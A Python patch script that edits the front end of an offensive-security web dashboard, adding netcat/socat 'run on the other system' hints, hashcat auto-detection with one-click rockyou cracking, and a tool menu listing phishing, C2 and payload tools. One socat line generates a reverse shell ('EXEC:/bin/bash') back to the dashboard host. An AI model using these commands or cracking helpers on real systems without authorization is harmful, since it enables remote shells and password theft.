#!/usr/bin/env python3
"""
Patch 03 (FIXED):
  - Netcat: show command for OTHER side
  - Socat: show command for OTHER side
  - Hashcat: auto-detect hash type + auto crack
  - Nav search: fix first-3-char search
  - Admin console: remove 'Add New Monitored Service' section
  - Auditing: unified ONE-LINE agent for all audit tools

Run: python3 patch_03_misc_fixed.py
"""
import os, shutil, re
from datetime import datetime

GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[93m"; CYAN="\033[96m"; RESET="\033[0m"; BOLD="\033[1m"
def ok(m): print(f"  {GREEN}✓{RESET}  {m}")
def fail(m): print(f"  {RED}✗{RESET}  {m}")
def info(m): print(f"  {CYAN}→{RESET}  {m}")
RESULTS = {"applied":0,"skipped":0,"failed":0}

def backup(path):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    shutil.copy2(path, f"{path}.{ts}.p03fix.bak")

with open("api_server.py","r",encoding="utf-8",errors="ignore") as f:
    SRC = f.read()

CHANGED = False

def apply(label, old, new):
    global SRC, CHANGED
    if old in SRC:
        SRC = SRC.replace(old, new, 1)
        ok(label); RESULTS["applied"]+=1; CHANGED=True
    elif new.strip()[:80] in SRC:
        print(f"  \033[2m·{RESET}  {label} (already applied)"); RESULTS["skipped"]+=1
    else:
        fail(f"{label} — anchor not found"); RESULTS["failed"]+=1

print(f"\n{BOLD}{CYAN}Patch 03 (Fixed) — Netcat/Socat/Hashcat/NavSearch/Admin/Auditing{RESET}\n")

# ─────────────────────────────────────────────────────────────────────────────
# 3A: Netcat — show "other side" command
# ─────────────────────────────────────────────────────────────────────────────
apply("Netcat: show other-side command",
r"""async function runNetcat(){
  var mode=document.getElementById('nc-mode').value, host=document.getElementById('nc-host').value.trim(), port=parseInt(document.getElementById('nc-port').value||'0',10), extra=document.getElementById('nc-extra').value.trim(), timeout=parseInt(document.getElementById('nc-timeout').value||'90',10);
  if(!port||port<1||port>65535){alert('Enter a valid port');return;}
  if(mode==='connect'&&!host){alert('Enter target host for connect mode');return;}
  var args=(mode==='listen'?('-l -p '+port):((host+' '+port)))+(extra?' '+extra:'');
  var btn=document.getElementById('nc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  ncTool.start();ncTool.log('Executing netcat mode: '+mode,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'netcat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'nc');
    var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat command completed','s');renderSocialTool(ncTool,d);}
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}""",
r"""async function runNetcat(){
  var mode=document.getElementById('nc-mode').value, host=document.getElementById('nc-host').value.trim(), port=parseInt(document.getElementById('nc-port').value||'0',10), extra=document.getElementById('nc-extra').value.trim(), timeout=parseInt(document.getElementById('nc-timeout').value||'90',10);
  if(!port||port<1||port>65535){alert('Enter a valid port');return;}
  if(mode==='connect'&&!host){alert('Enter target host for connect mode');return;}
  var args=(mode==='listen'?('-l -p '+port):((host+' '+port)))+(extra?' '+extra:'');
  var serverHost=window.location.hostname||'YOUR_IP';
  var otherCmd='';
  if(mode==='listen'){
    otherCmd='nc '+serverHost+' '+port+(extra?' '+extra:'');
  } else {
    otherCmd='nc -l -p '+port+(extra?' '+extra:'');
  }
  var btn=document.getElementById('nc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  ncTool.start();
  ncTool.log('Mode: '+mode,'i');
  ncTool.log('Other side: '+otherCmd,'w');
  var infoDiv=document.getElementById('nc-other-side');
  if(infoDiv){
    infoDiv.innerHTML='<div class="notice" style="margin-bottom:8px"><strong>Run on the other system:</strong><br/><code style="font-family:var(--mono);font-size:11px">'+otherCmd+'</code><button class="btn btn-outline btn-sm" style="margin-left:8px;font-size:10px" onclick="navigator.clipboard.writeText(this.previousSibling.textContent);showToast(\'Copied\',\'\',\'success\',1500)">COPY</button></div>';
    infoDiv.style.display='block';
  }
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'netcat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'nc');
    var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat command completed','s');renderSocialTool(ncTool,d);}
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}""")

# Add nc-other-side div to Netcat HTML page
apply("Netcat HTML: other-side div",
'<div class="progress-wrap" id="nc-prog"><div class="progress-bar" id="nc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="nc-term"></div>\n        <div class="err-box" id="nc-err"></div>\n        <div id="nc-res"></div>',
'<div id="nc-other-side" style="display:none;margin-bottom:8px"></div>\n        <div class="progress-wrap" id="nc-prog"><div class="progress-bar" id="nc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="nc-term"></div>\n        <div class="err-box" id="nc-err"></div>\n        <div id="nc-res"></div>')

# ─────────────────────────────────────────────────────────────────────────────
# 3B: Socat — show "other side" command
# ─────────────────────────────────────────────────────────────────────────────
apply("Socat: show other-side command",
r"""async function runSocat(){
  var left=document.getElementById('sc-left').value.trim(), right=document.getElementById('sc-right').value.trim(), extra=document.getElementById('sc-extra').value.trim(), timeout=parseInt(document.getElementById('sc-timeout').value||'90',10);
  if(!left||!right){alert('Enter both left and right addresses');return;}
  var args=(extra?extra+' ':'')+left+' '+right;
  var btn=document.getElementById('sc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  scTool.start();scTool.log('Executing socat bridge','i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'socat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'sc');
    var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log('Socat command completed','s');renderSocialTool(scTool,d);}
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}""",
r"""async function runSocat(){
  var left=document.getElementById('sc-left').value.trim(), right=document.getElementById('sc-right').value.trim(), extra=document.getElementById('sc-extra').value.trim(), timeout=parseInt(document.getElementById('sc-timeout').value||'90',10);
  if(!left||!right){alert('Enter both left and right addresses');return;}
  var args=(extra?extra+' ':'')+left+' '+right;
  var serverHost=window.location.hostname||'YOUR_IP';
  var otherCmd='';
  if(left.indexOf('TCP-LISTEN')>=0||left.indexOf('TCP4-LISTEN')>=0){
    var pm=left.match(/:(\d+)/);var lp=pm?pm[1]:'PORT';
    otherCmd='socat - TCP:'+serverHost+':'+lp;
  } else if(right.indexOf('TCP-LISTEN')>=0){
    var pm2=right.match(/:(\d+)/);var lp2=pm2?pm2[1]:'PORT';
    otherCmd='socat - TCP:'+serverHost+':'+lp2;
  } else {
    otherCmd='socat TCP:'+serverHost+':PORT EXEC:/bin/bash';
  }
  var btn=document.getElementById('sc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  scTool.start();scTool.log('Executing socat bridge: '+left+' <-> '+right,'i');
  scTool.log('Other side: '+otherCmd,'w');
  var infoDiv=document.getElementById('sc-other-side');
  if(infoDiv){
    infoDiv.innerHTML='<div class="notice" style="margin-bottom:8px"><strong>Run on the other system:</strong><br/><code style="font-family:var(--mono);font-size:11px">'+otherCmd+'</code><button class="btn btn-outline btn-sm" style="margin-left:8px;font-size:10px" onclick="navigator.clipboard.writeText(this.previousSibling.textContent);showToast(\'Copied\',\'\',\'success\',1500)">COPY</button></div>';
    infoDiv.style.display='block';
  }
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'socat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'sc');
    var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log('Socat command completed','s');renderSocialTool(scTool,d);}
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}""")

apply("Socat HTML: other-side div",
'<div class="progress-wrap" id="sc-prog"><div class="progress-bar" id="sc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="sc-term"></div>\n        <div class="err-box" id="sc-err"></div>\n        <div id="sc-res"></div>',
'<div id="sc-other-side" style="display:none;margin-bottom:8px"></div>\n        <div class="progress-wrap" id="sc-prog"><div class="progress-bar" id="sc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="sc-term"></div>\n        <div class="err-box" id="sc-err"></div>\n        <div id="sc-res"></div>')

# ─────────────────────────────────────────────────────────────────────────────
# 3C: Hashcat — auto-detect hash type + auto crack
# ─────────────────────────────────────────────────────────────────────────────
apply("Hashcat: auto-detect + auto-crack button",
r"""/* hashcat */
async function runHashcat(){
  var hashes=document.getElementById('hashcat-hashes').value.trim();
  if(!hashes){alert('Enter hashes or a file path');return;}
  var type=document.getElementById('hashcat-type').value||'0';
  var attack=document.getElementById('hashcat-attack').value||'0';
  var wordlist=document.getElementById('hashcat-wordlist').value.trim();
  var rules=document.getElementById('hashcat-rules').value.trim();
  var workload=document.getElementById('hashcat-workload').value||'2';
  var timeout=parseInt(document.getElementById('hashcat-timeout').value||'300',10);
  var args='-m '+type+' -a '+attack+' -w '+workload+' --status --status-timer=10 "'+hashes+'"';
  if(wordlist)args+=' "'+wordlist+'"';
  if(rules)args+=' -r "'+rules+'"';
  args+=' --force';
  var btn=document.getElementById('hashcat-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Cracking...';
  var t=mkTool('hashcat');t.start();t.log('Hashcat -m '+type+' -a '+attack,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'hashcat',operation:'custom',args:args,timeout:timeout})},Math.max(60000,timeout*1000+5000),'hashcat');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{t.log('Hashcat done','s');
      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'(no output)')+'</pre></div>');}
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN HASHCAT';}
}""",
r"""/* hashcat */
var _hashcatPatterns=[
  {re:/^\$2[aby]\$\d+\$/,mode:'3200',name:'bcrypt'},
  {re:/^\$6\$/,mode:'1800',name:'sha512crypt'},
  {re:/^\$5\$/,mode:'500',name:'sha256crypt'},
  {re:/^\$1\$/,mode:'500',name:'md5crypt'},
  {re:/^\$P\$/,mode:'400',name:'phpass (WordPress)'},
  {re:/^\$apr1\$/,mode:'1600',name:'APR1 MD5'},
  {re:/^[a-fA-F0-9]{32}$/,mode:'0',name:'MD5'},
  {re:/^[a-fA-F0-9]{40}$/,mode:'100',name:'SHA1'},
  {re:/^[a-fA-F0-9]{64}$/,mode:'1400',name:'SHA-256'},
  {re:/^[a-fA-F0-9]{128}$/,mode:'1700',name:'SHA-512'},
];
function hashcatDetect(){
  var raw=document.getElementById('hashcat-hashes').value.trim();
  if(!raw)return;
  var firstHash=raw.split('\n').map(function(l){return l.trim();}).filter(function(l){return l&&!l.startsWith('#');})[0]||'';
  var detected=null;
  for(var i=0;i<_hashcatPatterns.length;i++){
    if(_hashcatPatterns[i].re.test(firstHash)){detected=_hashcatPatterns[i];break;}
  }
  var infoEl=document.getElementById('hashcat-detect-info');
  var selEl=document.getElementById('hashcat-type');
  if(detected){
    if(infoEl)infoEl.innerHTML='<div class="notice" style="margin-bottom:8px;border-left-color:var(--green)">&#10003; Detected: <strong>'+detected.name+'</strong> (mode -m '+detected.mode+' auto-selected)</div>';
    if(selEl)selEl.value=detected.mode;
    return detected.mode;
  } else {
    if(infoEl)infoEl.innerHTML='<div class="notice" style="margin-bottom:8px">Could not auto-detect hash type — please select manually.</div>';
    return null;
  }
}
async function hashcatAutoCrack(){
  var mode=hashcatDetect();
  if(!mode){alert('Cannot auto-detect hash type — select manually then click RUN HASHCAT');return;}
  var wlEl=document.getElementById('hashcat-wordlist');
  if(wlEl&&!wlEl.value.trim())wlEl.value='/usr/share/wordlists/rockyou.txt';
  await runHashcat();
}
async function runHashcat(){
  var hashes=document.getElementById('hashcat-hashes').value.trim();
  if(!hashes){alert('Enter hashes or a file path');return;}
  var type=document.getElementById('hashcat-type').value||'0';
  var attack=document.getElementById('hashcat-attack').value||'0';
  var wordlist=document.getElementById('hashcat-wordlist').value.trim()||'/usr/share/wordlists/rockyou.txt';
  var rules=document.getElementById('hashcat-rules').value.trim();
  var workload=document.getElementById('hashcat-workload').value||'2';
  var timeout=parseInt(document.getElementById('hashcat-timeout').value||'300',10);
  var args='-m '+type+' -a '+attack+' -w '+workload+' --status --status-timer=10 "'+hashes+'"';
  if(wordlist)args+=' "'+wordlist+'"';
  if(rules)args+=' -r "'+rules+'"';
  args+=' --force';
  var btn=document.getElementById('hashcat-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Cracking...';
  var t=mkTool('hashcat');t.start();t.log('Hashcat -m '+type+' -a '+attack,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'hashcat',operation:'custom',args:args,timeout:timeout})},Math.max(60000,timeout*1000+5000),'hashcat');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{
      t.log('Hashcat done','s');
      var out=d.stdout||'(no output)';
      var highlighted=out.replace(/([a-fA-F0-9$]{20,}):(\S+)/g,'<span style="color:var(--red)">$1</span>:<span style="color:var(--green);font-weight:bold">$2</span>');
      t.res('<div class="card card-p"><div class="card-title" style="margin-bottom:6px">Hashcat Output</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+highlighted+'</pre></div>');
    }
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN HASHCAT';}
}""")

# Add detect/auto-crack buttons + oninput to hashcat HTML
apply("Hashcat HTML: detect + auto-crack buttons",
'<div class="fg"><label>HASH(ES) — paste hashes or enter file path</label>\n            <textarea class="inp inp-mono" id="hashcat-hashes" rows="4" placeholder="5f4dcc3b5aa765d61d8327deb882cf99&#10;/path/to/hashes.txt"></textarea>\n          </div>',
'<div class="fg"><label>HASH(ES) — paste hashes or enter file path</label>\n            <textarea class="inp inp-mono" id="hashcat-hashes" rows="4" placeholder="5f4dcc3b5aa765d61d8327deb882cf99&#10;/path/to/hashes.txt" oninput="hashcatDetect()"></textarea>\n          </div>\n          <div id="hashcat-detect-info"></div>\n          <div style="display:flex;gap:8px;margin-bottom:10px">\n            <button class="btn btn-outline btn-sm" onclick="hashcatDetect()">&#128270; AUTO-DETECT TYPE</button>\n            <button class="btn btn-primary btn-sm" onclick="hashcatAutoCrack()">&#9889; AUTO-CRACK (rockyou)</button>\n          </div>')

# ─────────────────────────────────────────────────────────────────────────────
# 3D: Nav search — inject vsNavSearch if missing
# ─────────────────────────────────────────────────────────────────────────────
if 'function vsNavSearch' not in SRC:
    apply("Nav search: inject vsNavSearch function",
    'loadUser();\nsetTimeout(renderHomeToolCatalog,120);',
    r"""/* ==== NAV SEARCH v2 ==== */
var _navAllTools=[
  {id:'home',name:'Home',cat:''},
  {id:'dash',name:'Dashboard',cat:''},
  {id:'hist',name:'History',cat:''},
  {id:'scan',name:'Network Scanner',cat:'Information'},
  {id:'dnsrecon',name:'DNSRecon',cat:'Information'},
  {id:'disc',name:'Network Discovery',cat:'Information'},
  {id:'sub',name:'Subdomain Finder',cat:'Information'},
  {id:'legion',name:'Legion',cat:'Information'},
  {id:'searchsploit',name:'SearchSploit',cat:'Information'},
  {id:'seclists',name:'SecLists',cat:'Information'},
  {id:'webdeep',name:'Deep Web Audit',cat:'Web Testing'},
  {id:'nikto',name:'Nikto',cat:'Web Testing'},
  {id:'wpscan',name:'WPScan',cat:'Web Testing'},
  {id:'dir',name:'Directory Buster',cat:'Web Testing'},
  {id:'ffuf',name:'ffuf Fuzzer',cat:'Web Testing'},
  {id:'nuclei',name:'Nuclei Templates',cat:'Web Testing'},
  {id:'whatweb',name:'WhatWeb',cat:'Web Testing'},
  {id:'wapiti',name:'Wapiti',cat:'Web Testing'},
  {id:'dalfox',name:'Dalfox XSS',cat:'Web Testing'},
  {id:'sqlmap',name:'SQLMap',cat:'Web Testing'},
  {id:'kxss',name:'kxss XSS',cat:'Web Testing'},
  {id:'brute',name:'Brute Force',cat:'Attacks'},
  {id:'medusa',name:'Medusa',cat:'Attacks'},
  {id:'hping3',name:'hping3',cat:'Attacks'},
  {id:'scapy',name:'Scapy',cat:'Attacks'},
  {id:'yersinia',name:'Yersinia',cat:'Attacks'},
  {id:'hashcat',name:'Hashcat Password Crack',cat:'Passwords'},
  {id:'john',name:'John the Ripper',cat:'Passwords'},
  {id:'setoolkit',name:'SET Social Engineer Toolkit',cat:'Social'},
  {id:'gophish',name:'Gophish Phishing',cat:'Social'},
  {id:'evilginx2',name:'Evilginx2',cat:'Social'},
  {id:'shellphish',name:'ShellPhish',cat:'Social'},
  {id:'netcat',name:'Netcat TCP UDP',cat:'C2'},
  {id:'socat',name:'Socat Bridge',cat:'C2'},
  {id:'ligolo',name:'Ligolo-ng Tunnel',cat:'C2'},
  {id:'msfvenom',name:'msfvenom Payload',cat:'Exploit'},
  {id:'radare2',name:'Radare2 Reverse Engineering',cat:'Reverse'},
  {id:'lynis',name:'Lynis Audit',cat:'Auditing'},
  {id:'openvas',name:'OpenVAS Vulnerability',cat:'Auditing'},
  {id:'chkrootkit',name:'chkrootkit Rootkit',cat:'Auditing'},
  {id:'rkhunter',name:'rkhunter Rootkit Hunter',cat:'Auditing'},
  {id:'admin',name:'Admin Console',cat:'Admin'},
  {id:'profile',name:'Profile Settings',cat:''},
];
var _navSelIdx=-1;
var _navResults=[];
function vsNavSearch(q){
  var box=document.getElementById('nav-search-results');
  if(!box)return;
  q=(q||'').trim().toLowerCase();
  if(q.length<1){box.style.display='none';_navResults=[];_navSelIdx=-1;return;}
  _navResults=_navAllTools.filter(function(t){
    return (t.name+' '+t.cat).toLowerCase().indexOf(q)>=0;
  }).slice(0,10);
  if(!_navResults.length){box.style.display='none';return;}
  box.innerHTML=_navResults.map(function(t,i){
    var hi=t.name.replace(new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi'),'<strong>$1</strong>');
    return '<div class="nav-item" id="nav-sr-'+i+'" onclick="pg(\''+t.id+'\',null);vsNavSearchClear()" style="border-bottom:1px solid var(--border);border-radius:0;padding:8px 12px">'
      +(t.cat?'<span style="font-size:9px;color:var(--text3);margin-right:6px;font-family:var(--mono)">'+t.cat+'</span>':'')
      +hi+'</div>';
  }).join('');
  box.style.display='block';
  _navSelIdx=-1;
}
function vsNavSearchKey(e){
  if(e.key==='Escape'){vsNavSearchClear();return;}
  if(e.key==='Enter'){
    if(_navSelIdx>=0&&_navResults[_navSelIdx]){pg(_navResults[_navSelIdx].id,null);vsNavSearchClear();}
    else if(_navResults.length===1){pg(_navResults[0].id,null);vsNavSearchClear();}
    return;
  }
  if(e.key==='ArrowDown'){_navSelIdx=Math.min(_navSelIdx+1,_navResults.length-1);vsNavHighlight();e.preventDefault();return;}
  if(e.key==='ArrowUp'){_navSelIdx=Math.max(_navSelIdx-1,0);vsNavHighlight();e.preventDefault();return;}
}
function vsNavHighlight(){
  _navResults.forEach(function(_,i){
    var el=document.getElementById('nav-sr-'+i);
    if(el)el.classList.toggle('active',i===_navSelIdx);
  });
}
function vsNavSearchClear(){
  var box=document.getElementById('nav-search-results');
  var inp=document.getElementById('nav-search-input');
  if(box)box.style.display='none';
  if(inp)inp.value='';
  _navResults=[];_navSelIdx=-1;
}
document.addEventListener('click',function(e){
  var box=document.getElementById('nav-search-results');
  var inp=document.getElementById('nav-search-input');
  if(box&&inp&&!box.contains(e.target)&&e.target!==inp)box.style.display='none';
});
/* END NAV SEARCH */
loadUser();
setTimeout(renderHomeToolCatalog,120);""")
else:
    print(f"  \033[2m·{RESET}  Nav search: vsNavSearch already exists (skipped)"); RESULTS["skipped"]+=1

# ─────────────────────────────────────────────────────────────────────────────
# 3E: Admin console — remove "Add New Monitored Service" section
# ─────────────────────────────────────────────────────────────────────────────
OLD_ADD_SVC = '''          <div class="card">
            <div class="card-header"><div class="card-title">Add New Monitored Service</div></div>
            <div class="card-p">
              <div class="grid3">
                <div class="fg">
                  <label>Quick Add</label>
                  <select class="inp inp-mono" id="svc-preset" onchange="applyServicePreset()">
                    <option value="">-- Select preset --</option>
                    <option value="apache2">Apache service</option>
                    <option value="supabase">Supabase connectivity</option>
                  </select>
                </div>
                <div class="fg"><label>Display Name</label><input class="inp inp-mono" id="svc-label" type="text" placeholder="My Service"/></div>
                <div class="fg"><label>Service Key</label><input class="inp inp-mono" id="svc-key" type="text" placeholder="my-service"/></div>
              </div>
              <div class="grid3">
                <div class="fg">
                  <label>Service Type</label>
                  <select class="inp inp-mono" id="svc-kind">
                    <option value="systemctl">systemctl unit</option>
                    <option value="command">custom command check</option>
                  </select>
                </div>
                <div class="fg"><label>Systemd Unit</label><input class="inp inp-mono" id="svc-unit" type="text" placeholder="apache2"/></div>
                <div class="fg"><label>Check Command (command type)</label><input class="inp inp-mono" id="svc-check" type="text" placeholder="python3 health_check.py"/></div>
              </div>
              <div style="margin-top:10px"><button class="btn btn-primary" onclick="addMonitoredService()">Add Service</button></div>
              <div id="svc-msg" style="margin-top:10px;color:var(--text3);font-size:12px"></div>
            </div>
          </div>'''

apply("Admin: remove Add New Monitored Service section",
      OLD_ADD_SVC,
      '<!-- Add New Monitored Service section removed -->')

# ─────────────────────────────────────────────────────────────────────────────
# 3F: Auditing — update Lynis page header for unified agent
# ─────────────────────────────────────────────────────────────────────────────

# Update the page title/desc to reflect multi-tool support
apply("Auditing: update page title to Remote Audit Agent",
      '        <div class="page-hd"><div class="page-title">Lynis</div><div class="page-desc">Local system security audit</div></div>',
      '        <div class="page-hd"><div class="page-title">Remote Audit Agent</div><div class="page-desc">Lynis · chkrootkit · rkhunter · OpenVAS — all audit tools on remote Linux systems</div></div>')

# Update the notice text
apply("Auditing: update notice text for multi-tool",
      '        <div class="notice">&#9432; Run local scan by default, or click a connected agent below to run Lynis remotely on that Linux machine. If you disconnect an agent, run the install curl command again on that Linux host to reconnect.</div>',
      '        <div class="notice">&#9432; Install the universal audit agent on any Linux system. Once connected, run Lynis, chkrootkit, rkhunter, or OpenVAS remotely. Re-run the install command at any time to reconnect a disconnected agent.</div>')

# Update Linux install label
apply("Auditing: update Linux install label",
      '            <label>ONE-LINE AGENT INSTALL (Linux)</label>',
      '            <label>ONE-LINE AGENT INSTALL — Linux (installs all audit tools + agent)</label>')

# Update Windows install label
apply("Auditing: update Windows install label",
      '            <label>ONE-LINE AGENT INSTALL (Windows PowerShell + WSL)</label>',
      '            <label>ONE-LINE AGENT INSTALL — Windows (via PowerShell + WSL)</label>')

# Add the audit tool pill selector after the Windows install row (before Connected Agents card)
# We insert it just before the connected agents dashed card
AGENTS_CARD_ANCHOR = '          <div class="card card-p" style="border:1px dashed var(--border2);margin-bottom:12px">'
AUDIT_TOOL_PILLS = '''          <div class="fg" style="margin-bottom:12px">
            <label>SELECT AUDIT TOOL TO RUN ON REMOTE AGENT</label>
            <div class="pills" style="margin-top:6px">
              <button class="pill on" id="audit-tool-lynis" onclick="selectAuditTool(\'lynis\',this)">Lynis</button>
              <button class="pill" id="audit-tool-chkrootkit" onclick="selectAuditTool(\'chkrootkit\',this)">chkrootkit</button>
              <button class="pill" id="audit-tool-rkhunter" onclick="selectAuditTool(\'rkhunter\',this)">rkhunter</button>
              <button class="pill" id="audit-tool-openvas" onclick="selectAuditTool(\'openvas\',this)">OpenVAS CLI</button>
            </div>
          </div>
          <div class="card card-p" style="border:1px dashed var(--border2);margin-bottom:12px">'''

apply("Auditing: add audit tool pill selector",
      AGENTS_CARD_ANCHOR,
      AUDIT_TOOL_PILLS)

# Add selectAuditTool JS function before copyLynisInstallCmd
apply("Auditing: add selectAuditTool JS function",
'function copyLynisInstallCmd(){',
r"""var _selectedAuditTool='lynis';
function selectAuditTool(tool,el){
  _selectedAuditTool=tool;
  document.querySelectorAll('[id^="audit-tool-"]').forEach(function(b){b.classList.remove('on');});
  if(el)el.classList.add('on');
  showToast('Selected',tool+' will run on remote agent','info',2000);
}
function copyLynisInstallCmd(){""")

# ─────────────────────────────────────────────────────────────────────────────
# Write changes
# ─────────────────────────────────────────────────────────────────────────────
print(f"\n{BOLD}{CYAN}Writing changes...{RESET}")
if CHANGED:
    backup("api_server.py")
    with open("api_server.py","w",encoding="utf-8") as f:
        f.write(SRC)
    ok("api_server.py written successfully")

    # Verify syntax
    import subprocess, sys
    result = subprocess.run(
        [sys.executable, "-m", "py_compile", "api_server.py"],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        ok("Syntax check PASSED — api_server.py is valid Python")
    else:
        fail(f"Syntax check FAILED:\n{result.stderr}")
        print(f"\n  {YELLOW}Restoring backup...{RESET}")
        # find most recent backup and restore
        import glob
        backups = sorted(glob.glob("api_server.py.*.p03fix.bak"), reverse=True)
        if backups:
            shutil.copy2(backups[0], "api_server.py")
            ok(f"Restored from {backups[0]}")
        else:
            fail("No backup found to restore!")
else:
    info("No changes to write")

print(f"\n  Applied:{GREEN}{RESULTS['applied']}{RESET}  "
      f"Skipped:\033[2m{RESULTS['skipped']}{RESET}  "
      f"Failed:{RED}{RESULTS['failed']}{RESET}\n")
